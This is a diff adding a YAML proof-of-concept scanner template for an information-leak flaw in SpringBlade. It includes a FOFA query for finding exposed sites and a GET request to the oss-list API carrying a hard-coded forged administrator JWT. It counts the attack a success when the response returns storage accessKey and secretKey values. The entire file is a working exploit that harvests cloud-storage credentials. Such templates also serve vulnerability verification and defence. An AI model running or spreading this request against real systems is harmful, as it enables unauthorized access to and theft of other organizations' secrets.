@@ -1,0 +1,18 @@
+id: poc-yaml-springblade-oss-list-info-leak
+info:
+  name: SpringBlade oss-list 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: springblade
+  fofa: body="https://bladex.vip"
+requests:
+- method: GET
+  path: /api/blade-resource/oss/list
+  headers:
+    Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
+  expression: status_code == 200 && contains(body,"\"success\":true") && matches(body,"\"categoryName\":\"[\u4e00-\u9fa5]+\"")
+    && matches(body,"\"accessKey\":\"[0-9a-zA-Z]+\"") && matches(body,"\"secretKey\":\"[0-9a-zA-Z]+\"")
+    && contains(headers,"application/json")
+variables: {}
+transport: http
